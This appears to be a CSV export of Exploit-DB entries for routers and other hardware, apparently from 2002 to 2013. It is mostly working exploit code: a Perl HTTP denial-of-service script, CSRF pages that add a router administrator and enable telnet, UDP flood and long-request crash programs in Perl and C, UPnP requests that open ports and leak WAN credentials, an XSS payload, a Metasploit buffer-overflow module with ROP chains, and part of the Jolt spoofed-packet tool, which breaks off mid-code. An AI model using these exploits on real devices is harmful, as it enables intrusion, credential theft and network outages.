# --------------------------------------------------------------------------
# Changed Probe Directive in nmap-service-probes file [4 d range]:
# - Line: 4682: Probe TCP GetRequest q|GET / HTTP/1.0\r\n\r\n|
# + Line: 4682: Probe TCP GetRequest q|GET /... HTTP/1.0\r\n\r\n|
# --------------------------------------------------------------------------
# # nping -c1 --tcp -p80 192.168.0.1 --data ""474554202f2e2e2e20485454502f312e310d0a0d0a""
# Starting Nping 0.6.01 ( http://nmap.org/nping ) at 2013-03-19 04:55 Central European Standard Time
# SENT (0.0920s) TCP 192.168.0.101:19835 > 192.168.0.1:80 S ttl=64 id=21796 iplen=61  seq=1961954057 win=1480
# RCVD (0.1220s) TCP 192.168.0.1:80 > 192.168.0.101:19835 RA ttl=64 id=0 iplen=40  seq=0 win=0
# Max rtt: 0.000ms | Min rtt: 0.000ms | Avg rtt: 0.000ms
# Raw packets sent: 1 (75B) | Rcvd: 1 (46B) | Lost: 0 (0.00%)
# Tx time: 0.04000s | Tx bytes/s: 1875.00 | Tx pkts/s: 25.00
# Rx time: 1.04000s | Rx bytes/s: 44.23 | Rx pkts/s: 0.96
# Nping done: 1 IP address pinged in 1.12 seconds
# --------------------------------------------------------------------------
# # nmap -Pn 192.168.0.1 -p80
# Starting Nmap 6.01 ( http://nmap.org ) at 2013-03-19 04:57 Central European Standard Time
# Nmap scan report for 192.168.0.1
# Host is up (0.00s latency).
# PORT   STATE  SERVICE
# 80/tcp closed http
# MAC Address: AA:BB:CC:DD:EE:FF (Tp-link Technologies CO.)
# Nmap done: 1 IP address (1 host up) scanned in 0.23 seconds
# ============================= !Playground ===============================
# Tested on: Router Webserver
# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
# Copyleft (c) 2013, Zero Science Lab
# Macedonian Information Security Research And Development Laboratory
# http://www.zeroscience.mk
# Advisory ID: ZSL-2013-5135
# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2013-5135.php
# 17.03.2013
# Codename: Threetwoees","﻿#!/usr/local/bin/perl
use IO::Socket;
$ip=""$ARGV[0]""; $port=""$ARGV[1]"";
print ""\n\n\x20"".""\x1f""x42 .""\n"";
print ""\x20\x1f"".""\x20""x40 .""\x1f\n"";
print ""\x20\x1f  TP-Link TL-WR740N httpd DoS Exploit   \x1f\n"";
print ""\x20\x1f"".""\x20""x40 .""\x1f\n"";
print ""\x20\x1f"".""\x20""x7 .""\x16""x5 .""\x20""x15 .""\x16""x5 .""\x20""x8 .""\x1f\n"";
print ""\x20\x1f"".""\x20""x9 .""\x16"".""\x20""x19 .""\x16"".""\x20""x10 .""\x1f\n"";
print ""\x20"" .""\x1f""x42 .""\n"";
print ""\x20\x4"" .""\x20""x40 .""\x4\n"";
print ""\x20"" .""\x1e"" x 42 .""\n"";
if($#ARGV<1)
print ""\n\n\x20\x20\x1a\x20Usage: $0 <ip> <port>\n\n"";
exit();
$socket=IO::Socket::INET->new(
Proto => ""tcp"",
PeerAddr => $ip,
PeerPort => $port
$ta4ke=""\x47\x45\x54\x20"".
""\x2f\x2e\x2e\x2e"".
""\x20\x48\x54\x54"".
""\x50\x2f\x31\x2e"".
""\x31\x0d\x0a\x0d"".
""\x0a"";
print ""\n\x20\x1a\x20Sending evil payload...\n""; sleep 2;
print $socket ""$ta4ke""; sleep 5; close $socket;
print ""\x20\x1a\x20HTTPd successfully poked.\n""; sleep 2;
print ""\x20\x1a\x20Verifying with Nmap...\n""; sleep 2;
system(""nmap -Pn $ip -p $port"");
print ""\n\x20\x1a\x20Playing goa-psy...\n""; sleep 2;
system(""start C:\\Progra~1\\Winamp\\winamp.exe http://scfire-ntc-aa01.stream.aol.com:80/stream/1008"");
sleep 1; print ""\x20\x1a\x20All Done!\n""; sleep 1;"
2013-03-19,WebApps,Hardware,Jacob Holcomb,Verizon Fios Router MI424WR-GEN3I,Cross-Site Request Forgery,"# Exploit Title: Verizon Fios Router CSRF Admin Shell
# Date: Discovered and reported January 2013
# Author: Jacob Holcomb/Gimppy - Security Analyst @ Independent Security Evaluators
# Software: Verizon FIOS Router - Firmware 40.19.36 (http://verizon.com)
# CVE: CVE-2013-0126
# Advisory/Video: http://infosec42.blogspot.com/2013/03/verizon-fios-router-csrf-cve-2013-0126.html","US CERT Disclosure: http://www.kb.cert.org/vuls/id/278204
Exploit Code:
HTML FILE #1
<html>
<title>Cisco Verizon FIOS CSRF - Adding Administrator User</title>
<!--Cisco Model: MI424WR-GEN3I -->
<!--Firmware Version: 40.19.36 -->
<h1>Please sit tight while we upgrade your router</h1>
<body>
<form name=""verizonCisco"" action=""http://192.168.1.1/index.cgi"" method=""post"">
<input type=""hidden"" name=""active_page"" value=""101""/>
<input type=""hidden"" name=""page_title"" value=""User Settings""/>
<input type=""hidden"" name=""mimic_button_field"" value=""submit_button_submit: ..""/>
<input type=""hidden"" name=""button_value"" value="".""/>
<input type=""hidden"" name=""strip_page_top"" value=""0""/>
<input type=""hidden"" name=""user_id"" value=""-1""/>
<input type=""hidden"" name=""fullname_defval"" value=""""/>
<input type=""hidden"" name=""fullname"" value=""g42""/>
<input type=""hidden"" name=""username_defval"" value=""""/>
<input type=""hidden"" name=""username"" value=""G42""/>
<input type=""hidden"" name=""user_level"" value=""2""/>
<input type=""hidden"" name=""email_system_notify_level"" value=""15""/>
<input type=""hidden"" name=""email_security_notify_level"" value=""15""/>
</form>
<script>
function CSRF1() {window.open(""http://10.0.1.101/verizonFIOS2.html"");};window.setTimeout(CSRF1,1000)
function CSRF2() {document.verizonCisco.submit();};window.setTimeout(CSRF2,1000)
</script>
</body>
</html>
HTML FILE #2
<html>
<title>Cisco Verizon FIOS CSRF2 - Add User w/ No Pass Confirmation</title>
<body>
<form name=""verizonCiscoC"" action=""http://192.168.1.1/index.cgi"" method=""post"">
<input type=""hidden"" name=""active_page"" value=""101""/>
<input type=""hidden"" name=""page_title"" value=""User Settings""/>
<input type=""hidden"" name=""mimic_button_field"" value=""submit_button_confirm_submit: ..""/>
<input type=""hidden"" name=""button_value"" value="".""/>
<input type=""hidden"" name=""strip_page_top"" value=""0""/>
</form>
<script>
function CSRF1() {window.open(""http://10.0.1.101/verizonFIOS3.html"");};window.setTimeout(CSRF1,0500)
function CSRF2() {document.verizonCiscoC.submit();};window.setTimeout(CSRF2,0500)
</script>
</body>
</html>
HTML FILE #3
<html>
<title>Cisco Verizon FIOS CSRF3 - Enable Remote Administration</title>
<body>
<form name=""verizonCiscoRemote"" action=""http://192.168.1.1/index.cgi"" method=""post"">
<input type=""hidden"" name=""active_page"" value=""9078""/>
<input type=""hidden"" name=""active_page_str"" value=""page_remote_admin""/>
<input type=""hidden"" name=""page_title"" value=""Remote Administration""/>
<input type=""hidden"" name=""mimic_button_field"" value=""submit_button_submit: ..""/>
<input type=""hidden"" name=""button_value"" value=""""/>
<input type=""hidden"" name=""strip_page_top"" value=""0""/>
<input type=""hidden"" name=""is_telnet_primary"" value=""1""/>
<input type=""hidden"" name=""is_telnet_primary_defval"" value=""0""/>
<input type=""hidden"" name=""is_telnet_secondary_defval"" value=""0""/>
<input type=""hidden"" name=""is_telnet_ssl_defval"" value=""0""/>
<input type=""hidden"" name=""is_http_primary_defval"" value=""0""/>
<input type=""hidden"" name=""is_http_secondary_defval"" value=""0""/>
<input type=""hidden"" name=""is_https_primary_defval"" value=""0""/>
<input type=""hidden"" name=""is_https_secondary_defval"" value=""0""/>
<input type=""hidden"" name=""is_diagnostics_icmp_defval"" value=""0""/>
<input type=""hidden"" name=""is_diagnostics_traceroute_defval"" value=""0""/>
<input type=""hidden"" name=""is_telnet_secondary"" value=""1""/>
</form>
<script>
function CSRF1() {document.verizonCiscoRemote.submit();};window.setTimeout(CSRF1,0000)
</script>
</body>
</html>"
2004-11-22,Remote,Hardware,Francisco Canela,ZYXEL 3 Prestige Router,HTTP Remote Administration Configuration Reset,"source: https://www.securityfocus.com/bid/11723/info
http://www.example.com/rpFWUpload.html","ZyXEL Prestige router series is reported prone to an access validation vulnerability. The vulnerability exists because the firmware of the router fails to restrict access to a configuration page that is a part of the ZyXEL Prestige HTTP based remote administration service.
A remote attacker may exploit this vulnerability to reset the configuration of the router."
2004-10-13,Remote,Hardware,Karb0nOxyde,3Com 3CRADSL72 ADSL Wireless Router,Information Disclosure / Authentication Bypass,"source: https://www.securityfocus.com/bid/11408/info
http://www.example.com/app_sta.stm","3Com 3CRADSL72 is reported prone to an information disclosure, and an authentication bypass vulnerability. This issue can allow a remote attacker to disclose sensitive information such as the router name, primary and secondary DNS servers, default gateway. Attackers could also reportedly gain administrative access to the router.
If successful, these vulnerabilities can be used to the launch of other attacks against the device and other users on the vulnerable network."
2013-03-04,WebApps,Hardware,Ivano Binetti,D-Link DSL-2740B ADSL Router,Authentication Bypass,"# Exploit Title      : D-Link DSL-2740B (ADSL Router) Authentication Bypass
# Date               : 10-02-2013
# Author             : Ivano Binetti (http://ivanobinetti.com)
# Vendor site        : http://www.d-link.com
# Version            : DSL-2740B
# Tested on          : Firmware Version: EU_1.0 (other models/firmware could be also affected)
# Original Advisory  : http://www.webapp-security.com/2013/03/d-link-dsl-2740b-adsl-router-authentication-bypass/
# CVE                : CVE-2013-2271
http://<ip address>/login.cgi (where <ip address> can be both internal or public)","+---------------------------------------[D-Link DSL-2740B Bypass Authentication by Ivano Binetti]-------------------------------------------+
Summary
1)Introduction
2)Vulnerability Description
3)Exploit
1)Introduction
D-Link DSL-2740B is an ADSL Router using a web management interface in order to change configuration settings.
2)Vulnerability Description
This router allows an attacker to bypass authentication and to login with administrator (""admin"" user) permissions.
When the administrator is logged in the web management interface, an attacker is be able to completely bypass authentication phase and
connect to the web management interface with administrator's credentials.
Please observe that the default URL to access to the web management interface is ""http://192.168.1.1"" but this attack can also be
performed by an axternal attacker who connects to the router's public IP address, if remote management is enabled.
3)Exploit
When an administrator in logged in the web management interface an attacker can bypass authentication and get administrator permissions
connecting to the following URL:"
2004-06-22,Remote,Hardware,Konstantin V. Gavrilenko,BT Voyager 2000 Wireless ADSL Router,SNMP Community String Information Disclosure,source: https://www.securityfocus.com/bid/10589/info,"BT Voyager 2000 Wireless ADSL Router is reported prone to a sensitive information disclosure vulnerability.
It is reported that 'public' SNMP MIB community strings which, are world readable by default contain sensitive information pertaining to the internal protected network.
Data collected by exploiting this vulnerability may be used in further attacks against the victim network.
root@abyrvalg:~# snmpwalk -v 1 -c public 192.168.1.1
SNMPv2-MIB::sysDescr.0 = STRING: BT Voyager 2000 Wireless ADSL Router
SNMPv2-MIB::sysObjectID.0 = OID: SNMPv2-SMI::enterprises.2535.111.6
SNMPv2-MIB::sysUpTime.0 = Timeticks: (260430184) 30 days, 1:02:01.84
[snip]
SNMPv2-SMI::transmission.23.2.3.1.5.5.1 = STRING:
""name.surname@btbroadband.com""
SNMPv2-SMI::transmission.23.2.3.1.5.6.1 = """"
SNMPv2-SMI::transmission.23.2.3.1.5.7.1 = """"
SNMPv2-SMI::transmission.23.2.3.1.5.8.1 = """"
SNMPv2-SMI::transmission.23.2.3.1.5.9.1 = """"
SNMPv2-SMI::transmission.23.2.3.1.5.10.1 = """"
SNMPv2-SMI::transmission.23.2.3.1.5.11.1 = """"
SNMPv2-SMI::transmission.23.2.3.1.5.12.1 = """"
SNMPv2-SMI::transmission.23.2.3.1.6.0.1 = """"
SNMPv2-SMI::transmission.23.2.3.1.6.0.2 = """"
SNMPv2-SMI::transmission.23.2.3.1.6.0.3 = """"
SNMPv2-SMI::transmission.23.2.3.1.6.0.4 = """"
SNMPv2-SMI::transmission.23.2.3.1.6.0.5 = """"
SNMPv2-SMI::transmission.23.2.3.1.6.0.6 = """"
SNMPv2-SMI::transmission.23.2.3.1.6.0.7 = """"
SNMPv2-SMI::transmission.23.2.3.1.6.0.8 = """"
SNMPv2-SMI::transmission.23.2.3.1.6.5.1 = STRING: ""password""
[snip]"
2004-01-06,Remote,Hardware,Rafel Ivgi,Edimax AR-6004 ADSL Router,Management Interface Cross-Site Scripting,"source: https://www.securityfocus.com/bid/9374/info
http://www.example.com/<script>alert('XSS')</script>","Edimax AR-6004 ADSL Routers are prone to cross-site scripting attacks via the web management interface of affected devices. An attacker could exploit this issue by enticing a victim user to follow a malicious link to a site hosting the software that contains embedded HTML and script code. The embedded code may be rendered in the web browser of the victim user.
This could potentially be exploited to steal cookie-based authentication credentials from legitimate users. Other attacks are also possible."
2003-09-26,DoS,Hardware,_6mO_HaCk,SMC Router 1.2x,Random UDP Packet Denial of Service,"source: https://www.securityfocus.com/bid/8711/info
# Overview :
# ZoneAlarm is a firewall software
# package designed for Microsoft Windows
# operating systems that blocks intrusion
# attempts, trusted by millions, and has
# advanced privacy features like worms,
# Trojan horses, and spyware protection.
# ZoneAlarm is distributed and maintained
# by Zone Labs.http://www.zonelabs.com
# Details :
# ZoneAlarm was found vulnerable to a
# serious vulnerability leading to a
# remote Denial Of Service condition due
# to failure to handle udp random
# packets, if an attacker sends multiple
# udp packets to multiple ports 0-65000,
# the machine will hang up until the
# attacker stop flooding.
# The following is a remote test done
# under ZoneAlarm version 3.7.202 running
# on windows xp home edition.
# on irc test1 joined running ZoneAlarm
# version 3.7.202 with default
# installation
# * test1 (test@62.251.***.**) has joined #Hackology
# from a linux box :
# [root@mail DoS]# ping 62.251.***.**
# PING 62.251.***.** (62.251.***.**) from
# ***.***.**.** : 56(84) bytes of data.
# --- 62.251.***.** ping statistics ---
# 7 packets transmitted, 0 received, 100%
# loss, time 6017ms
# on irc
# -> [test1] PING
# [test1 PING reply]: 1secs
# Host is firewalled and up
# now lets try to dos
# --- ZoneAlarm Remote DoS Xploit
# ---
# --- Discovered & Coded By _6mO_HaCk
# [*] DoSing 62.251.***.** ... wait 1
# minute and then CTRL+C to stop
# [root@mail DoS]#
# after 2 minutes
# * test1 (test@62.251.***.**) Quit (Ping timeout)
# I have made the same test on ZoneAlarm
# Pro 4.0 Release running on windows xp
# professional and i've got the same
# result.
# Exploit released : 02/09/03
# Vulnerable Versions : ALL
# Operating Systems : ALL Windows
# Successfully Tested on :
# ZoneAlarm version 3.7.202 / windows xp
# home edition / windows 98.
# ZoneAlarm Pro 4.0 Release / windows xp
# professional
# Vendor status : UNKOWN
# Solution : Shut down ZoneAlarm and wait
# for an update.
# The following is a simple code written
# in perl to demonstrate that, the code
# is clean, it wont eat your cpu usage
# and it doesnt need to be run as root
# but you still have to use it at your
# own risk and on your own machine or
# remotly after you get permission.
# Big thanx go to D|NOOO and frost for
# providing me windows boxes with
# zonealarm for testing
# Greetz to ir7ioli, BlooDMASK
# Abderrahman@zone-h.org
# NRGY, Le_Ro| JT ghosted_ Securma,
# anasoft SySiPh, phrack, DeV|L0Ty,
# MajNouN |BiG-LuV| h4ckg1rl and all
# my ppl here in Chicago and in Morocco
# Comments suggestions or additional info
# feel free to contact me at
# simo@benyoussef.org
# _6mO_HaCk@linuxmail.org
#!/usr/bin/perl","A denial of service has been reported in the SMC SMC2404WBR BarricadeT Turbo 11/22 Mbps Wireless Cable/DSL Broadband Router. It is possible to trigger this condition by sending UDP packets randomly to ports 0-65000.
The SMC7004VWBR router is also affected by this vulnerability.
use Socket;
system(clear);
print ""\n"";
print ""--- ZoneAlarm Remote DoS Xploit\n"";
print ""---\n"";
print ""--- Discovered & Coded By _6mO_HaCk\n"";
print ""\n"";
if(!defined($ARGV[0]))
&usage
my ($target);
$target=$ARGV[0];
my $ia       = inet_aton($target)    || die (""[-] Unable to resolve
$target"");
socket(DoS, PF_INET, SOCK_DGRAM, 17);
$iaddr = inet_aton(""$target"");
print ""[*] DoSing $target ... wait 1 minute and then CTRL+C to stop\n"";
for (;;) {
$size=$rand x $rand x $rand x $rand x $rand x $rand x $rand x $rand x
$rand x $rand x $rand x $rand x $rand x $rand x $rand x $rand x $rand x
$rand x $rand;
$port=int(rand 65000) +1;
send(DoS, 0, $size, sockaddr_in($port, $iaddr));
sub usage {die(""\n\n[*] Usage : perl $0 <Target>\n\n"");}"
2003-07-23,DoS,Hardware,David F. Madrid,Xavi X7028r DSL Router,UPNP Long Request Denial of Service,source: https://www.securityfocus.com/bid/8252/info,"A problem has been reported in the handling of requests of excessive length placed to the service on port 280 by the Xavi X7028r DSL router. This may allow an attacker to crash a vulnerable router.
perl -e 'print ""GET /"".""A""x1008;print ""\nHost:www.example.com:280\n\n\n\n\n""' | netcat -v -n www.example.com 80"
2003-07-21,DoS,Hardware,David F.Madrid,3Com DSL Router 812 1.1.7/1.1.9/2.0,Administrative Interface Long Request Denial of Service,"// source: https://www.securityfocus.com/bid/8248/info
/* 3com-DoS.c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>","A problem in the 3Com 812 OfficeConnect has been reported that may result in the router becoming unstable. Because of this, an attacker may be able to deny service to legitimate users of the vulnerable router by submitting an excessively long request.
* PoC DoS exploit for 3Com OfficeConnect DSL Routers.
This PoC exploit the
* vulnerability documented at:
<https://www.securityfocus.com/bid/8248>,
* discovered by David F. Madrid.
* Successful exploitation of the vulnerability should
cause the router to
* reboot.  It is not believed that arbitrary code
execution is possible -
* check advisory for more information.
* -shaun2k2
int main(int argc, char *argv[]) {
if(argc < 3) {
printf(""3Com OfficeConnect DSL Router DoS exploit by
shaun2k2 - <shaunige@yahoo.co.uk>\n\n"");
printf(""Usage: 3comDoS <3com_router> <port>\n"");
exit(-1);
int sock;
char explbuf[521];
struct sockaddr_in dest;
struct hostent *he;
if((he = gethostbyname(argv[1])) == NULL) {
printf(""Couldn't resolve %s!\n"", argv[1]);
exit(-1);
if((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
perror(""socket()"");
exit(-1);
printf(""3Com OfficeConnect DSL Router DoS exploit by
shaun2k2 - <shaunige@yahoo.co.uk>\n\n"");
dest.sin_addr = *((struct in_addr *)he->h_addr);
dest.sin_port = htons(atoi(argv[2]));
dest.sin_family = AF_INET;
printf(""[+] Crafting exploit buffer.\n"");
memset(explbuf, 'A', 512);
memcpy(explbuf+512, ""\n\n\n\n\n\n\n\n"", 8);
if(connect(sock, (struct sockaddr *)&dest,
sizeof(struct sockaddr)) == -1) {
perror(""connect()"");
exit(-1);
printf(""[+] Connected...Sending exploit buffer!\n"");
send(sock, explbuf, strlen(explbuf), 0);
sleep(2);
close(sock);
printf(""\n[+] Exploit buffer sent!\n"");
return(0);"
2003-07-14,Remote,Hardware,cw,Asus AAM6330BI/AAM6000EV ADSL Router,Information Disclosure,"source: https://www.securityfocus.com/bid/8183/info
http://<host>/userdata
http://<host>/snmpinit","It has been reported that remote users may be able to obtain sensitive information from Asus ADSL routers. It is possible to request files from the built-in Web server that contain information such as usernames, passwords and other configuration information."
2003-05-08,DoS,Hardware,Lorenzo Cerulli & Fabio Annunziato,Verilink NetEngine 6100-4 Broadband Router,TFTP Packet Remote Denial of Service,"source: https://www.securityfocus.com/bid/7575/info
https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/22596.zip","It has been reported that a problem with Verilink broadband routers exists in the handling of TFTP packets. Because of this, an attacker could potentially deny service to legitimate users of the network."
2003-04-03,Remote,Hardware,stickler,Netgear FM114P ProSafe Wireless Router,Rule Bypass,source: https://www.securityfocus.com/bid/7270/info,"The Netgear FM114P allows certain ports to be blocked, both for external users attempting to enter the local network and for local users connecting to the WAN. If Remote Access and Universal Plug and Play are both enabled on the WAN interface, a UPnP SOAP request can cause a connection to be intitiated through a port that is normally blocked.
POST /upnp/service/WANPPPConnection HTTP/1.1
Content-Type: text/xml; charset=""utf-8""
SOAPAction: ""urn:schemas-upnp-org:service:WANPPPConnection:1#AddPortMapping""
User-Agent: Mozilla/4.0 (compatible; UPnP/1.0; Windows 9x)
Host: 192.168.0.1
Content-Length: 1123
Connection: Keep-Alive
Pragma: no-cache
<?xml version=""1.0""?>
<SOAP-ENV:Envelope
xmlns:SOAP-ENV=""http://schemas.xmlsoap.org/soap/envelope/""
SOAP-ENV:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/"">
<SOAP-ENV:Body>
<m:AddPortMapping xmlns:m=""urn:schemas-upnp-org:service:WANPPPConnection:1"">
<NewRemoteHost xmlns:dt=""urn:schemas-microsoft-com:datatypes""
dt:dt=""string""></NewRemoteHost>
<NewExternalPort xmlns:dt=""urn:schemas-microsoft-com:datatypes""
dt:dt=""ui2"">139</NewExternalPort>
<NewProtocol xmlns:dt=""urn:schemas-microsoft-com:datatypes""
dt:dt=""string"">TCP</NewProtocol>
<NewInternalPort xmlns:dt=""urn:schemas-microsoft-com:datatypes""
dt:dt=""ui2"">139</NewInternalPort>
<NewInternalClient xmlns:dt=""urn:schemas-microsoft-com:datatypes""
dt:dt=""string"">192.168.0.6</NewInternalClient>
<NewEnabled xmlns:dt=""urn:schemas-microsoft-com:datatypes""
dt:dt=""boolean"">1</NewEnabled>
<NewPortMappingDescription xmlns:dt=""urn:schemas-microsoft-com:datatypes""
dt:dt=""string"">NetBios</NewPortMappingDescription>
<NewLeaseDuration xmlns:dt=""urn:schemas-microsoft-com:datatypes""
dt:dt=""ui4"">0</NewLeaseDuration>
</m:AddPortMapping>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>"
2003-04-03,Remote,Hardware,stickler,Netgear FM114P ProSafe Wireless Router,UPnP Information Disclosure,source: https://www.securityfocus.com/bid/7267/info,"The Netgear FM114P ProSafe Wireless Router is vulnerable to information disclosure. If Remote Access and Universal Plug and Play are both enabled on the WAN interface, a UPnP SOAP request can retrieve the username and password for the WAN interface.
POST /upnp/service/WANPPPConnection HTTP/1.1
HOST: 192.168.0.1:80
SOAPACTION: ""urn:schemas-upnp-org:service:WANPPPConnection:1#GetUserName""
CONTENT-TYPE: text/xml ; charset=""utf-8""
Content-Length: 289
<?xml version=""1.0"" encoding=""utf-8""?>
<s:Envelope s:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/""
xmlns:s=""http://schemas.xmlsoap.org/soap/envelope/"">
<s:Body>
<u:GetUserName
xmlns:u=""urn:schemas-upnp-org:service:WANPPPConnection:1"" />
</s:Body>
</s:Envelope>"
2012-10-10,Remote,Windows,Metasploit,Avaya WinPMD UniteHostRouter,Remote Buffer Overflow (Metasploit),"# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/","require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
Rank = NormalRanking
include Msf::Exploit::Remote::Udp
def initialize(info = {})
super(update_info(info,
'Name'           => 'Avaya WinPMD UniteHostRouter Buffer Overflow',
'Description'    => %q{
This module exploits a stack buffer overflow in Avaya WinPMD. The vulnerability
exists in the UniteHostRouter service, due to the insecure usage of memcpy when
parsing specially crafted ""To:"" headers. The module has been tested successfully on
Avaya WinPMD 3.8.2 over Windows XP SP3 and Windows 2003 SP2.
'Author'         =>
'Abdul-Aziz Hariri', # Vulnerability discovery
'Abysssec', # PoC
'juan vazquez' # Metasploit module
'References'     =>
['OSVDB', '82764'],
['OSVDB', '73269'],
['BID', '47947'],
['EDB', '18397'],
['URL', 'https://downloads.avaya.com/css/P8/documents/100140122'],
['URL', 'http://secunia.com/advisories/44062']
'Payload'        =>
'BadChars' => ""\x00\x0d\x0a\x20\x2f\x3a\x3f"",
'Space' => 1024,
'DisableNops' => true
'Platform'       => 'win',
'Targets'        =>
['Avaya WinPMD 3.8.2 / Windows XP SP3',
'Offset' => 260,
'Ret' => 0x77c2e93b # MOV EAX,EDI # POP EDI # RETN from msvcrt
['Avaya WinPMD 3.8.2 / Windows 2003 SP2',
'Offset' => 260,
'Ret' => 0x0040e0f2 # ADD ESP,44 # POP ESI # ADD ESP,0C8 # RETN from UniteHostRouter.EXE
'Privileged'     => true,
'DisclosureDate' => 'May 23 2011',
'DefaultTarget'  => 0
register_options([ Opt::RPORT(3217) ], self.class)
end
def junk(n=4)
return rand_text_alpha(n).unpack(""V"")[0].to_i
end
def nop
return make_nops(4).unpack(""V"")[0].to_i
end
def exploit
connect_udp
if target.name =~ /Windows XP SP3/
buf = ""\xeb\x7f"" # jmp short $+0x81
buf << rand_text(0x81 - 2)
buf << ""\xeb\x7f"" # jmp short $+0x81
buf << rand_text(0x81 - 2)
buf << ""\xeb\x64"" # jmp short $+0x66 # jmp to shellcode in the heap
buf << [target.ret].pack(""V"") # MOV EAX,EDI # POP EDI # RETN # from msvcrt # EDI points to data in the heap
buf << [0x77c5f9a0].pack(""V"") # Readable address with string # from msvcrt
buf << ([0x77c3c99c].pack(""V"")) * 21 # (INC EAX # RETN) * 21 # from msvcrt # EAX points to data in th heap, align to shellcode position
buf << [0x77c168cd].pack(""V"") # jmp eax # from msvcrt.dll # JMP to shellcode in the heap
elsif target.name =~ /Windows 2003 SP2/
rop_gadgets =
0x77bb2563, # POP EAX # RETN
0x77ba1114, # <- *&VirtualProtect()
0x77bbf244, # MOV EAX,DWORD PTR DS:[EAX] # POP EBP # RETN
junk,
0x77bb0c86, # XCHG EAX,ESI # RETN
0x77bc9801, # POP EBP # RETN
0x77be2265, # ptr to 'push esp #  ret'
0x77bb2563, # POP EAX # RETN
0x03C0990F,
0x77bdd441, # SUB EAX, 03c0940f  (dwSize, 0x500 -> ebx)
0x77bb48d3, # POP EBX, RET
0x77bf21e0, # .data
0x77bbf102, # XCHG EAX,EBX # ADD BYTE PTR DS:[EAX],AL # RETN
0x77bbfc02, # POP ECX # RETN
0x77bef001, # W pointer (lpOldProtect) (-> ecx)
0x77bd8c04, # POP EDI # RETN
0x77bd8c05, # ROP NOP (-> edi)
0x77bb2563, # POP EAX # RETN
0x03c0984f,
0x77bdd441, # SUB EAX, 03c0940f
0x77bb8285, # XCHG EAX,EDX # RETN
0x77bb2563, # POP EAX # RETN
nop,
0x77be6591, # PUSHAD # ADD AL,0EF # RETN
].pack(""V*"")
buf = rand_text(3) # padding
buf << rop_gadgets
buf << ""\xeb\x7f"" # jmp $+0x81
buf << rand_text(0x81-2)
buf << ""\xeb\x25"" # jmp short $+0x66 => to shellcode
buf << rand_text(target['Offset'] - buf.length)
buf << ""\xf2\xe0\x40"" # EIP => # ADD ESP,44 # POP ESI # ADD ESP,0C8 # RETN from [UniteHostRouter.EXE # stackpivot to heap
end
request = ""UTP/1 To: 127.0.0.1 /#{buf}\r\n\r\n""
if target.name =~ /Windows 2003 SP2/
request << ""\x81\xc4\x54\xf2\xff\xff"" # Stack adjustment # add esp, -3500
end
request << payload.encoded # The shellcode will be stored in the heap
print_status(""#{rhost}:#{rport} - Trying to exploit #{target.name}..."")
udp_sock.put(request)
disconnect_udp
end
end"
2002-08-22,DoS,Hardware,Lukasz Bromirski,LG LR3100p 1.30 Series Router,IP Packet Flags Denial of Service,source: https://www.securityfocus.com/bid/5550/info,"The LR series WAN routers are hardware and firmware solutions manufactured and distributed by LG Electronics.
It has been reported that scanning some LG routers using various IP flags can cause the router to become unstable. When the router is scanned with a tool such as nmap, and the fingerprinting option is enabled, the router may crash.
nmap -O www.example.com"
2002-07-27,DoS,Hardware,FX,Lucent Access Point 300/600/1500 IP Services Router,Long HTTP Request Denial of Service,source: https://www.securityfocus.com/bid/5333/info,"The Lucent Access Point series of routers support a web based administrative interface. An error has been reported in the embedded HTTP server.
It has been reported that sending a HTTP request consisting of approximately 4000 characters of data will cause the device to reboot. This may result in an interruption of service for legitimate users of the device.
wget `perl -e 'print ""http://router_ip/""; print ""A""x4000; print ""/"";`"
2002-07-24,DoS,Hardware,Jeff w. Roberson,ZYXEL Prestige 642R Router,Malformed IP Packet Denial of Service,"// source: https://www.securityfocus.com/bid/5292/info
/* Jolt 1.0 (c) 1997 by Jeff w. Roberson
/* Yah this is for linux, but i like the BSD ip header better then linux's */
#define __BSD_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <string.h>
#include <arpa/inet.h>","ZyXEL 642R and Prestige 310 routers have difficulties handling IP packets that are malformed. Reportedly, when ZyXEL routers receive a single specially malformed packet, they stop responding for exactly 30 seconds.
ZyXEL 642R and Prestige 310 routers are reportedly affected by this vulnerability. It is possible that other ZyNOS-based routers are also affected by this vulnerability
* Please, if you use my code give me credit.  Also, if i was the first to
* find this glitch, please give me credit.  Thats all i ask.
* Ok so all this does is build a really fraggmented over sized packet
* and once win95 gets it, and puts it back together it locks.  I send
* multiple packets by default cause some times it takes a few packets to
* totally freeze the host.  Maybe its spending processor time to figure
* out how to put them back together?  I've had reports of people blue
* screening from it tho so we'll let Microsoft's boys figure out exactly
* what this does to 95.  As of now i haven't tested it on NT, but maybe
* i will later ;).  All of this source wasn't origonally written by me
* I just took one of the old programs to kill POSIX and SYSV based
* systems and worked on it abit, then made it spoof =).
* VallaH  (yaway@hotmail.com)
*  Update: It apears to work on some older versions of mac os
int main(int argc, char **argv)
int s,i;
char buf[400];
struct ip *ip = (struct ip *)buf;
struct icmphdr *icmp = (struct icmphdr *)(ip + 1);
struct hostent *hp, *hp2;
struct sockaddr_in dst;
int offset;
int on = 1;
int num = 5;
bzero(buf, sizeof buf);
if ((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW )) < 0) {
perror(""socket"");
exit(1);
if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
perror(""IP_HDRINCL"");
exit(1);
if (argc < 3) {
printf(""Jolt v1.0 Yet ANOTHER windows95(And macOS!) glitch by VallaH (yaway@hotmail.com)\n"");
printf(""\nusage: %s <dstaddr> <saddr> [number]\n"",argv[0]);
printf(""\tdstaddr is the host your attacking\n"");
printf(""\tsaddr is the host your spoofing from\n"");
